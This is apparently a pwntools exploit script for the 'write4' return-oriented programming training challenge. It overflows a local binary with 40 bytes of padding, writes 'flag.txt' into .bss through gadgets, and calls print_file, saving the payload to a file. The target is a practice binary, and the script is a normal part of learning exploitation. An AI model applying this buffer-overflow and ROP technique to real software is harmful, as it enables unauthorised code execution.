import sys
from pwn import *

elf = ELF('write4')
io = process(elf.path)

# gadgets
pop_r14_r15 = 0x400690
r15_into_r14 = 0x400628
pop_rdi = 0x400693

# values
bss = 0x601038
print_file = 0x400510
flag_txt = b'flag.txt'


rop_chain = p64(pop_r14_r15)
rop_chain += p64(bss)
rop_chain += flag_txt
rop_chain += p64(r15_into_r14)
rop_chain += p64(pop_rdi)
rop_chain += p64(bss)
rop_chain += p64(print_file)

exploit = b'A' * 40 + rop_chain

with open('./payload', 'wb') as payload_fh:
    payload_fh.write(exploit)

io.sendline(exploit)
io.interactive()
